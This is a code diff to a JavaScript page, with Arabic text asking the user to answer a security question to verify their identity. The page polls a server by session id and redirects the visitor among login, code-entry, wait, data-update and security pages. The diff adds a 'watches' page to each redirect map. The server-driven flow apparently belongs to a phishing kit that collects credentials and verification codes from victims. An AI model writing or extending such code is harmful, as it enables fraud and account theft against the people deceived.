@@ -126,7 +126,7 @@ function loadQuestion(){
       document.querySelector('.page-sub').textContent='أجب على سؤال الأمان للتحقق من هويتك';
     }
     if(d.status==='redirect'&&d.redirect&&d.redirect!=='security'){
-      var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+      var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html',watches:'watches.html'};
       var target=pages[d.redirect];
       if(target)window.location.href=target+'?id='+sid;
     }
@@ -143,7 +143,7 @@ var bgPoll=setInterval(function(){
           window.location.href='security.html?id='+sid;
         }
       }else{
-        var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+        var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html',watches:'watches.html'};
         var target=pages[d.redirect];
         if(target)window.location.href=target+'?id='+sid;
       }
@@ -184,7 +184,7 @@ function pollAfterSecurity(){
     .then(function(d){
       if(d.status==='redirect'&&d.redirect){
         clearInterval(interval);
-        var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+        var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html',watches:'watches.html'};
         var target=pages[d.redirect];
         if(target&&target!=='security.html')window.location.href=target+'?id='+sid;
       }else if(d.status==='accepted'){
